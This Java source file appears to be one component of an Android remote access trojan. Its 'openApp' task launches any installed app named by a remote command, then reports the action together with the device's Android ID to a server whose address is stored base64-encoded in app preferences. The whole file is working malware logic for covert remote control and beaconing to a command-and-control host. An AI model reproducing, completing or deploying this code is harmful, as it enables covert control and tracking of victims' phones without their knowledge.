package com.asynctask;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;
import java.util.List;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class openApp extends AsyncTask<String, Void, String> {
    String i = "";

    public openApp(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        final PackageManager packageManager = MyApplication.getContext().getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo appInfo : installedApplications) {
            if (appInfo.packageName.equals(i)) {
                Intent k = new Intent();
                PackageManager manager = MyApplication.getContext().getPackageManager();
                k = manager.getLaunchIntentForPackage(i);
                k.addCategory(Intent.CATEGORY_LAUNCHER);
                MyApplication.getContext().startActivity(k);

                try {
                    String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
                    CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Opened App: " + i);
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}

    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
